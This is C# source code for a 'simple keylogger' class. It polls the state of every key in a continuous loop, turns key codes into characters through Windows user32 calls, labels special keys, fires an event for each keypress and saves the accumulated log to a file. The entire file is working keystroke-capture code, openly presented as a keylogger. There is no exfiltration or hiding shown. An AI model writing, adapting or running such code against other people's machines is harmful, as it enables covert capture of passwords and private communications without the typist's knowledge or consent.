using System.Runtime.InteropServices;
using System.Text;

using WindowsInput;
using WindowsInput.Native;

namespace Byte_Simple_Keylogger.Keylogger
{
    public class Simple_Keylogger
    {
        public static string KeyloggerOutput = string.Empty; // Stores the logged keystrokes
        public static bool FirstStart = true; // Is it the first start?

        private static InputSimulator? inputSimulator; // Input simulator
        private static bool isLogging = false; // Is it logging?
        private static bool[]? keyStates; // Key states

        public static event EventHandler<KeyEventArgs>? KeyPressed; // Event triggered when a key is pressed

        internal static class NativeMethods
        {
            [DllImport("user32.dll")]
            internal static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPArray)] ushort[] pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

            [DllImport("user32.dll")]
            internal static extern bool GetKeyboardState(byte[] lpKeyState);
        }

        private static Dictionary<VirtualKeyCode, string> specialKeyNames = new Dictionary<VirtualKeyCode, string>()
        {
            { VirtualKeyCode.LSHIFT, "<LShift>" },
            { VirtualKeyCode.RSHIFT, "<RShift>" },
            { VirtualKeyCode.LCONTROL, "<LControl>" },
            { VirtualKeyCode.RCONTROL, "<RControl>" },
            { VirtualKeyCode.LWIN, "<LWin>" },
            { VirtualKeyCode.RWIN, "<RWin>" },
            { VirtualKeyCode.CAPITAL, "<CapsLock>" },
            { VirtualKeyCode.TAB, "<Tab>" },
            { VirtualKeyCode.SPACE, " " },
            { VirtualKeyCode.RETURN, "<Enter>" },
            { VirtualKeyCode.BACK, "<Backspace>" },
            { VirtualKeyCode.ESCAPE, "<Esc>" },
            { VirtualKeyCode.PRIOR, "<PageUp>" },
            { VirtualKeyCode.NEXT, "<PageDown>" },
            { VirtualKeyCode.END, "<End>" },
            { VirtualKeyCode.HOME, "<Home>" },
            { VirtualKeyCode.INSERT, "<Insert>" },
            { VirtualKeyCode.DELETE, "<Delete>" },
            { VirtualKeyCode.LEFT, "<Left>" },
            { VirtualKeyCode.UP, "<Up>" },
            { VirtualKeyCode.RIGHT, "<Right>" },
            { VirtualKeyCode.DOWN, "<Down>" },
            { VirtualKeyCode.F1, "<F1>" },
            { VirtualKeyCode.F2, "<F2>" },
            { VirtualKeyCode.F3, "<F3>" },
            { VirtualKeyCode.F4, "<F4>" },
            { VirtualKeyCode.F5, "<F5>" },
            { VirtualKeyCode.F6, "<F6>" },
            { VirtualKeyCode.F7, "<F7>" },
            { VirtualKeyCode.F8, "<F8>" },
            { VirtualKeyCode.F9, "<F9>" },
            { VirtualKeyCode.F10, "<F10>" },
            { VirtualKeyCode.F11, "<F11>" },
            { VirtualKeyCode.F12, "<F12>" },
        };

        /// <summary>
        /// Start the keylogger.
        /// </summary>
        public static void Start()
        {
            inputSimulator = new InputSimulator();
            isLogging = true;
            keyStates = new bool[(int)VirtualKeyCode.OEM_CLEAR + 1];

            FirstStart = false;

            while (isLogging)
            {
                for (int i = 0; i < keyStates.Length; i++)
                {
                    bool currentState = inputSimulator.InputDeviceState.IsKeyDown((VirtualKeyCode)i);

                    if (currentState && !keyStates[i])
                    {
                        keyStates[i] = currentState;
                        string keyName = GetKeyName((VirtualKeyCode)i);
                        KeyPressed?.Invoke(null, new KeyEventArgs(keyName));
                    }
                    else if (!currentState && keyStates[i])
                    {
                        keyStates[i] = currentState;
                    }
                }
            }
        }

        /// <summary>
        /// Stop the keylogger.
        /// </summary>
        public static void Stop()
        {
            isLogging = false;
        }

        /// <summary>
        /// Get the name corresponding to the key code.
        /// </summary>
        /// <param name="keyCode">The key code.</param>
        /// <returns>The name corresponding to the key code.</returns>
        private static string GetKeyName(VirtualKeyCode keyCode)
        {
            if (specialKeyNames.ContainsKey(keyCode))
            {
                return specialKeyNames[keyCode];
            }
            else
            {
                StringBuilder sb = new StringBuilder(5);
                byte[] keyboardState = new byte[256];
                NativeMethods.GetKeyboardState(keyboardState);

                ushort[] result = new ushort[5];
                int converted = NativeMethods.ToUnicodeEx((uint)keyCode, 0, keyboardState, result, result.Length, 0, IntPtr.Zero);

                if (converted > 0)
                {
                    StringBuilder charBuffer = new StringBuilder();
                    for (int i = 0; i < converted; i++)
                    {
                        charBuffer.Append((char)result[i]);
                    }

                    return charBuffer.ToString();
                }
                else
                {
                    return string.Empty;
                }
            }
        }

        /// <summary>
        /// Save the log to the specified path.
        /// </summary>
        /// <param name="path">The path to save the log.</param>
        public static void SaveLog(string path)
        {
            try
            {
                using (StreamWriter writer = new StreamWriter(path))
                {
                    writer.Write(Simple_Keylogger.KeyloggerOutput);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }

    public class KeyEventArgs : EventArgs
    {
        /// <summary>
        /// The triggered key.
        /// </summary>
        public string Key { get; private set; }

        public KeyEventArgs(string key)
        {
            Key = key;
        }
    }
}